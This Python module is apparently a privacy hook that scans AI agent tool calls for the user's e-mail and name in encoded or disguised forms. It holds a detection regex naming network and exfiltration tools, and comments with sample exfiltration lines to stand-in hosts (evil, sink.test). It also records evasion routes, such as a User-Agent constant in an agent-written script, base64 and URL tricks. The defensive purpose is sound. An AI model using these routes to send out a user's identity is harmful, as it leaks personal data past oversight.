"""Find the user's own identity (e-mail addresses, name) in an outbound tool call.

The scanner knows WHO the user is, so it can look for exactly those strings in every disguise an agent might produce
(case, diacritics, URL/HTML encoding, base64, "name at domain dot com", separators) without flagging every other
e-mail address on the internet. Pure stdlib, no model: a typical tool call scans in well under a millisecond.
"""
import base64
import binascii
import html
import re
import unicodedata
from dataclasses import dataclass, field, replace
from pathlib import Path
from urllib.parse import unquote, unquote_plus, urlsplit

from egress_guard.fuzzy import clean, contact_hits, fuzzy_hits

_FOLD = str.maketrans({"ł": "l", "Ł": "L", "ø": "o", "Ø": "O", "ß": "ss", "đ": "d", "Đ": "D", "æ": "ae", "œ": "oe"})
_B64 = re.compile(r"[A-Za-z0-9+/_-]{12,}={0,2}")
_AT = re.compile(r"\s*(?:\(at\)|\[at\]|\{at\}|<at>|\bat\b|\bmałpa\b|\bmalpa\b)\s*", re.IGNORECASE)
_DOT = re.compile(r"\s*(?:\(dot\)|\[dot\]|\{dot\}|<dot>|\bdot\b|\bkropka\b)\s*", re.IGNORECASE)
_SEP = re.compile(r"[\s._+\-]+")

# Bash commands that send data off the machine. Anything else (git config, echo > file) is local and is not blocked
# in the default mode; `strict` scans every call.
NETWORK = re.compile(
    r"\b(?:curl|wget|http|https|httpie|xh|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|ftp|lftp|"
    r"invoke-webrequest|invoke-restmethod|iwr|irm|start-bitstransfer|"
    r"requests\.|urllib|httpx|aiohttp|fetch\(|axios|got\(|websocket|smtplib|sendmail|mail\s|gh\s+api|"
    r"\bimport\s+socket\b|\bfrom\s+socket\s+import\b|\bsocket\.(?:socket|create_connection)\b|"
    r"\bcreate_connection\s*\(|"
    r"\bgit(?:\.exe)?\b[^|;&\n]*?\s(?:push|pull|fetch|clone|ls-remote|remote\s+(?:add|set-url)|submodule|archive\s+--remote|send-email|request-pull)\b|\b(?:git|ssh|svn)://|http\.client|ftplib|telnetlib|/dev/(?:tcp|udp)/)", re.IGNORECASE)


# Code that sends requests (for files the agent writes). Narrower than NETWORK: a note with a URL is not code.
NETWORK_CODE = re.compile(
    r"(?:\bcurl\b|\bwget\b|user-agent|urllib|\brequests\.|\bhttpx\b|aiohttp|http\.client|\bfetch\(|\baxios\b|"
    r"invoke-webrequest|invoke-restmethod|smtplib|net/http|reqwest|HttpClient|WebClient|"
    r"\bimport\s+requests\b|\bfrom\s+requests\b|\bsocket\.|websocket|grpc)", re.IGNORECASE)


_CHAIN = re.compile(r"&&|\|\||;|\n")


def _split_chain(text: str) -> list[str]:
    """Split a shell line at `&&`, `||`, `;` and newlines outside quotes: `curl x -d 'a;git config ...'` keeps the
    quoted body in the curl segment (final release review, 2026-10-31). An unclosed quote keeps the rest together."""
    segs: list[str] = []
    cur: list[str] = []
    quote = ""
    i = 0
    while i < len(text):
        c = text[i]
        if c == "\\" and quote != "'" and i + 1 < len(text):
            cur.append(text[i:i + 2])
            i += 2
            continue
        if quote:
            if c == quote:
                quote = ""
        elif c in "'\"":
            quote = c
        else:
            m = _CHAIN.match(text, i)
            if m:
                segs.append("".join(cur))
                cur = []
                i = m.end()
                continue
        cur.append(c)
        i += 1
    segs.append("".join(cur))
    return segs
# (`echo X > f && python send.py` reads f at run time, so a write next to a network command is kept)
_LOCAL_ONLY = re.compile(r"\s*(?:git\s+(?:config|commit|tag|log|show|status|add|init)\b|cd\s|export\s+GIT_)")
_EXT = r"\.(?:py|js|mjs|cjs|ts|sh|bash|ps1|rb|pl|php)"
_SCRIPT = re.compile(r'"([^"]+' + _EXT + r')"|\'([^\']+' + _EXT + r')\'|([^\s"\';|&]+' + _EXT + r')(?=[\s"\';|&]|$)')
_CD = re.compile(r'\bcd\s+(?:"([^"]+)"|([^\s;&|]+))')
DOC_SUFFIXES = {".md", ".markdown", ".txt", ".rst", ".adoc", ".html", ".htm", ".csv", ".tex", ".log"}


def _file_text(tool_input) -> str:
    path = tool_input.get("file_path") or tool_input.get("path") if isinstance(tool_input, dict) else None
    try:
        p = Path(path) if path else None
        if p and p.is_file() and p.stat().st_size < 2_000_000:
            return p.read_text(encoding="utf-8", errors="replace")
    except (OSError, ValueError):
        pass
    return ""


def fold(s: str) -> str:
    """Lower case, no diacritics (also the letters NFKD does not split, e.g. Polish ł)."""
    if s.isascii():  # nothing to fold; skips a per-character pass over large inputs
        return s.lower()
    s = unicodedata.normalize("NFKD", s.translate(_FOLD))
    return "".join(c for c in s if not unicodedata.combining(c)).lower()


def squash(s: str) -> str:
    """fold() without separators: 'Jan.Kowalski', 'jan_kowalski' and 'JanKowalski' become one string."""
    return _SEP.sub("", fold(s))


def views(text: str) -> list[str]:
    """The text as the receiving server may read it: decoded URLs and HTML, base64 runs, spelled-out @ and dots."""
    out, cur = [text], text
    lookalike = clean(text)  # Cyrillic/Greek look-alike letters, full-width, zero-width characters
    if lookalike != text:
        out.append(lookalike)
        cur = lookalike
    for _ in range(2):  # double URL-encoding
        nxt = unquote_plus(cur)
        if nxt == cur:
            break
        out.append(nxt)
        cur = nxt
    out.append(html.unescape(cur))
    runs = []
    for run in _B64.findall(text):
        # '/' is a base64 letter, so a token in a URL path ('/u/<b64>/x') is caught together with the path around it
        # and decodes misaligned; also try every contiguous span of '/'-separated pieces (the token may contain '/')
        runs.append(run)
        parts = run.split("/")
        if 1 < len(parts) <= 12:
            for i in range(len(parts)):
                for j in range(i + 1, len(parts) + 1):
                    piece = "/".join(parts[i:j])
                    if piece != run and len(piece) >= 12:
                        runs.append(piece)
    for run in runs:
        padded = run + "=" * (-len(run) % 4)
        for dec in (base64.b64decode, base64.urlsafe_b64decode):
            try:
                raw = dec(padded)
            except (binascii.Error, ValueError):
                continue
            s = raw.decode("utf-8", "ignore")
            if s and sum(c.isprintable() for c in s) >= 0.9 * len(s):
                out.append(s)
            break
    spelled = _DOT.sub(".", _AT.sub("@", cur))
    if spelled != cur:
        out.append(spelled)
    return out


@dataclass
class Identity:
    emails: list[str] = field(default_factory=list)
    names: list[str] = field(default_factory=list)  # full names, e.g. "Jan Kowalski"
    extra: list[str] = field(default_factory=list)  # other strings that must never leave: phone, street, nickname
    # names guessed, not configured (e.g. "First Last" spelled by a first.last@ address): only the full name counts,
    # never the surname alone, so a guess that is really a team mailbox ("info.support@") cannot block "support-bot"
    derived_names: list[str] = field(default_factory=list)
    allow_hosts: list[str] = field(default_factory=list)  # destinations where the identity may go (own git host...)
    # strings that contain the identity but are fine to send (a folder or domain named after the user, a public
    # handle); they are cut out of the call before matching, case-insensitively
    ignore: list[str] = field(default_factory=list)
    # 0.2.0: look-alike spellings and e-mails in contact fields; "ask" (the user decides), "deny" or "off"
    fuzzy: str = "ask"
    contact_fields: str = "ask"
    # addresses agents may send without asking (User-Agent, From, forms); never list your private address here
    allow_emails: list[str] = field(default_factory=list)
    first_alone: bool = False  # also ask about the first name on its own (useful for a rare first name)

    def needles(self) -> list[tuple[str, str, str]]:
        """(kind, folded needle, squashed needle) for every form we look for."""
        out = []
        for e in self.emails:
            e = e.strip()
            if "@" not in e:
                continue
            local, domain = e.rsplit("@", 1)
            out.append(("email", fold(e), squash(e)))
            base = local.split("+", 1)[0]  # plus-addressing: jan+crates@x.com is still jan@x.com
            if base != local:
                out.append(("email", fold(f"{base}@{domain}"), squash(f"{base}@{domain}")))
            name_parts = {squash(p) for n in self.names + self.derived_names for p in n.split()}
            # the mailbox name alone identifies the user, unless it is just a first name (agnieszka@...) or short
            if len(squash(base)) >= 6 and squash(base) not in name_parts:
                out.append(("email-local", fold(base), squash(base)))
        for n in self.names:
            parts = [p for p in re.split(r"\s+", n.strip()) if p]
            if len(parts) >= 2:
                first, last = parts[0], parts[-1]
                for form in (f"{first} {last}", f"{last} {first}", f"{first[0]}. {last}", f"{last}, {first}"):
                    out.append(("name", fold(form), squash(form)))
                out.append(("first", fold(first), squash(first)))  # not matched alone; tells people apart
                if len(last) >= 5:
                    # Polish inflection: Kowalski -> Kowalskiego, Wiśniewska -> Wiśniewskiej; drop a final vowel
                    stem = fold(last)[:-1] if len(last) >= 6 and fold(last)[-1] in "aeiouy" else fold(last)
                    out.append(("surname", stem, squash(stem)))
        for n in self.derived_names:
            parts = [p for p in re.split(r"\s+", n.strip()) if p]
            if len(parts) >= 2:
                for form in (f"{parts[0]} {parts[-1]}", f"{parts[-1]} {parts[0]}", f"{parts[-1]}, {parts[0]}"):
                    out.append(("name", fold(form), squash(form)))
        for x in self.extra:
            if len(squash(x)) >= 5:
                # a phrase ("Jan Desktop") is matched as a whole phrase, like a name; one word keeps inflection
                out.append(("extra-phrase" if len(x.split()) >= 2 else "extra", fold(x), squash(x)))
        return out


@dataclass
class Finding:
    kind: str
    needle: str
    where: str


def _unaccent(s: str) -> str:
    """fold() without lower-casing, so capitalisation survives at the same positions."""
    if s.isascii():
        return s
    s = unicodedata.normalize("NFKD", s.translate(_FOLD))
    return "".join(c for c in s if not unicodedata.combining(c))


_PRECEDING_NAME = re.compile(r"([A-Z][a-z]{2,})[ _]$")
_TITLES = {"mr", "mrs", "ms", "dr", "pan", "pani", "prof"}


def _is_user_first(word: str, firsts: set[str]) -> bool:
    """'Jana', 'Pawła', 'Zofii' are the user's first name inflected (Polish): compare a common stem."""
    return word in _TITLES or any(word[:max(3, len(f) - 2)] == f[:max(3, len(f) - 2)] for f in firsts)


def _phrase_at(uv: str, sn: str) -> bool:
    """The squashed phrase `sn` occurs in `uv` (case kept, no diacritics), letters optionally split by separators,
    and starts and ends on a word boundary. A boundary is a non-letter or a lower->Upper step, so 'JanKowalskiBot',
    'jan_kowalski84' and 'Jan.Kowalski' match, but 'Admin Users Guide' does not match the phrase 'Admin User'
    (Codex review r2, 2026-10-29: substring matching blocked ordinary words)."""
    pat = r"[\s._+\-]*".join(re.escape(c) for c in sn)
    for m in re.finditer(pat, uv, re.IGNORECASE):
        a, b = m.start(), m.end()
        start_ok = a == 0 or not uv[a - 1].isalpha() or (uv[a - 1].islower() and uv[a].isupper())
        end_ok = b == len(uv) or not uv[b].isalpha() or (uv[b - 1].islower() and uv[b].isupper())
        if start_ok and end_ok:
            return True
    return False


def _hits(text: str, needles) -> list[Finding]:
    found = []
    firsts = {fn for kind, fn, _ in needles if kind == "first"}
    for v in views(text):
        uv = _unaccent(v)
        fv = uv.lower()
        sv = squash(v)
        for kind, fn, sn in needles:
            if kind == "first":
                continue
            if kind in ("surname", "email-local", "extra"):
                # a word on its own, plus up to 4 letters of Polish inflection, with a word boundary before it
                extra = 4 if kind == "surname" else 3
                for m in re.finditer(r"(?<![a-z0-9])" + re.escape(fn) + r"[a-z]{0,%d}(?![a-z0-9])" % extra, fv):
                    if kind == "surname":
                        # 'Anna_Kowalski' or 'Anna Kowalska' is someone else with the user's surname
                        prev = _PRECEDING_NAME.search(uv[:m.start()])
                        if prev and not _is_user_first(prev.group(1).lower(), firsts):
                            continue
                    found.append(Finding(kind, fn, v[:80]))
                    break
            elif kind in ("name", "extra-phrase"):
                # long phrases also without separators ('JanKowalski'); short ones only as written, as whole words
                if (_phrase_at(uv, sn) if len(sn) >= 8 else
                        re.search(r"(?<![a-z])" + re.escape(fn) + r"(?![a-z])", fv)):
                    found.append(Finding(kind.replace("-phrase", ""), fn, v[:80]))
            elif fn in fv or (len(sn) >= 8 and sn in sv):
                found.append(Finding(kind, fn, v[:80]))
    return found


def strings_of(obj) -> list[str]:
    if isinstance(obj, str):
        return [obj]
    if isinstance(obj, dict):
        return [s for v in obj.values() for s in strings_of(v)]
    if isinstance(obj, (list, tuple)):
        return [s for v in obj for s in strings_of(v)]
    return []


_NON_HTTP = re.compile(r"\b(?:scp|sftp|ssh|rsync|nc|ncat|socat|telnet|ftp|sendmail)\b|\S@[\w.-]+:")


# allow_hosts does not apply to shell commands: a shell line can name an allowed host and send elsewhere in too many
# ways (pipes, substitutions, git ssh "host:path", gh --hostname); found one by one in the release review, 2026-10-30
SHELL_TOOLS = ("Bash", "PowerShell", "exec_command", "shell")


_PROTO_REL = re.compile(r"(?<![\w:/])//([A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,})(?=[/:?#\s'\"]|$)")
# inputs above this size get exact checks only: fuzzy matching over every decoded view of megabytes of text
# outran the hook timeout (8 MB: 13 s; Sol review r2, 2026-11-01). Tool calls this large are rare.
FUZZY_MAX = 256_000


def host_allowed(text: str, allow_hosts: list[str]) -> bool:
    if _NON_HTTP.search(text):
        return False  # `scp f user@evil:/tmp # https://github.com`: the real target is not the URL
    hosts = []
    # every destination counts: URLs in the raw and URL-decoded text (`?next=https%3A%2F%2Fsink.test`), and
    # protocol-relative `//sink.test/` (fetch('//sink.test/?u=...') next to an allowed url; Sol review r2, 2026-11-01)
    for t in dict.fromkeys((text, unquote(text), unquote(unquote(text)))):
        # overlapping: `https://ok.org/?next=https://sink.test` holds two destinations
        for url in re.findall(r"(?=(https?://[^\s'\"<>]+))", t, re.IGNORECASE):
            authority = re.split(r"[/?#]", url.split("://", 1)[1], maxsplit=1)[0]
            try:
                parts = urlsplit(url)
                host = parts.hostname
            except ValueError:
                return False
            # `https://trusted.test:pw@sink.test/`: userinfo hides the real host (final review, 2026-10-31);
            # a backslash in the host part (`https://sink.test\.trusted.test`) is a path separator to browsers.
            # A backslash later in the URL (a `\n` in code after it) is not (false block, 2026-11-01).
            if not host or "@" in authority or "\\" in authority:
                return False
            hosts.append(host.rstrip("."))
        for host in _PROTO_REL.findall(t):
            hosts.append(host.lower().rstrip("."))
    return bool(hosts) and all(any(h == a or h.endswith("." + a) for a in allow_hosts) for h in hosts)


def _runs_network_script(command: str, cwd: str | None) -> bool:
    """`SEC_UA="<identity>" python fetch.py`: the command names no network tool, but the script it runs may send the
    data it gets through argv or env (seen in the reproduction, 2026-10-26). Read the scripts it runs."""
    for m in _SCRIPT.finditer(command):
        base = Path(cwd) if cwd else Path.cwd()
        for c in _CD.finditer(command[:m.start()]):  # `cd "dir" && python x.py`; a later `cd` does not count
            d = Path(c.group(1) or c.group(2))
            base = d if d.is_absolute() else base / d
        p = Path(m.group(1) or m.group(2) or m.group(3))
        for cand in (p,) if p.is_absolute() else (base / p, p):
            try:
                if cand.is_file() and cand.stat().st_size < 2_000_000 and \
                        NETWORK_CODE.search(cand.read_text(encoding="utf-8", errors="replace")):
                    return True
            except OSError:
                continue
    return False


def safe_ignore(ident: Identity) -> list[str]:
    """`ignore` entries that are used. `ignore` only hides name matches (e-mails are always checked on the uncut
    call), and only a literal token: an entry with whitespace or `%`, one that is a piece of a protected form
    ("kowalski", "Jan-Kowalski"), or one that hides the name only in an encoded form (base64, URL encoding) is
    dropped. A token that spells the name out ("blogJanKowalskiSite") is kept."""
    needles = ident.needles()
    forms = [sq for _, _, sq in needles if sq]
    keep = []
    for x in ident.ignore:
        x = str(x)
        sx = squash(x)
        if not sx or "%" in x or any(c.isspace() for c in x.strip()) or any(sx in f for f in forms):
            continue
        if _hits(x, needles) and not any(f in sx for f in forms):
            continue  # it matches only after decoding
        keep.append(x)
    return keep


def scan_tool_call(tool_name: str, tool_input, ident: Identity, strict: bool = False,
                   cwd: str | None = None) -> list[Finding]:
    """Findings for one PreToolUse event (Claude Code and Codex send the same tool_name / tool_input shape)."""
    texts = strings_of(tool_input)
    joined = "\n".join(texts)
    if isinstance(tool_input, dict) and isinstance(tool_input.get("workdir"), str):
        cwd = tool_input["workdir"]  # Codex exec_command runs in its own workdir
    if tool_name in ("Bash", "PowerShell", "exec_command", "shell") and not strict:
        if not NETWORK.search(joined) and not _runs_network_script(joined, cwd):
            return []
        # `git config user.email X && curl ...`: the local part of a chain does not send anything
        texts = [seg for t in texts for seg in _split_chain(t)
                 if not _LOCAL_ONLY.match(seg) or NETWORK.search(seg) or _runs_network_script(seg, cwd)]
    if tool_name in ("Write", "Edit", "MultiEdit", "apply_patch", "NotebookEdit") and not strict:
        # A local file is fine, unless it is code that talks to the network: in the reproduction (2026-10-26) the
        # e-mail went out from a script the agent wrote (User-Agent constant) and then ran as `python script.py`,
        # a command that shows no data. For an edit, the network code may sit elsewhere in the file, so read it.
        path = str(tool_input.get("file_path") or tool_input.get("path") or "") if isinstance(tool_input, dict) else ""
        if Path(path).suffix.lower() in DOC_SUFFIXES:
            return []  # a note or report that mentions a User-Agent is not code that sends one
        code = joined + "\n" + _file_text(tool_input)
        if not NETWORK_CODE.search(code):
            return []
    host_ok = bool(ident.allow_hosts) and host_allowed(joined, ident.allow_hosts)
    if host_ok and tool_name not in SHELL_TOOLS:
        return []
    if host_ok:
        # a shell line can name an allowed host and still send elsewhere (pipes, substitutions, git host:path;
        # release review 2026-10-30), so an allowed host in a shell command turns a block into a question
        return [Finding(f.kind + "@host", f.needle, f.where)
                for f in scan_tool_call(tool_name, tool_input, replace(ident, allow_hosts=[]), strict, cwd)]
    needles = ident.needles()
    ignore = safe_ignore(ident)
    cut = re.compile("|".join(re.escape(x) for x in ignore), re.IGNORECASE) if ignore else None
    out, seen = [], set()
    for t in texts:
        found = _hits(t, needles)
        if cut:  # e-mails from the whole call, names from the call with the ignored tokens cut out
            found = [f for f in found if f.kind.startswith("email")] + \
                    [f for f in _hits(cut.sub(" ", t), needles) if not f.kind.startswith("email")]
        for f in found:
            if (f.kind, f.needle) not in seen:
                seen.add((f.kind, f.needle))
                out.append(f)
    if out:
        return out
    for t in texts:
        extra = []
        if ident.fuzzy != "off" and len(t) <= FUZZY_MAX:
            for v in dict.fromkeys(views(cut.sub(" ", t) if cut else t)):  # also URL-decoded, base64, "at"/"dot"
                extra += fuzzy_hits(v, ident.emails, ident.names, ident.first_alone, ident.extra,
                                    ident.derived_names)
        if ident.contact_fields != "off" and len(t) <= FUZZY_MAX:
            extra += contact_hits(t, ident.allow_emails)
        for kind, what in extra:
            if (kind, what) not in seen:
                seen.add((kind, what))
                out.append(Finding(kind, fold(what), t[:80]))
    return out


# findings that are a question for the user (by default), not a hard block
ASK_KINDS = {"name-fuzzy", "surname-fuzzy", "first-fuzzy", "email-fuzzy", "extra-fuzzy", "contact-email"}

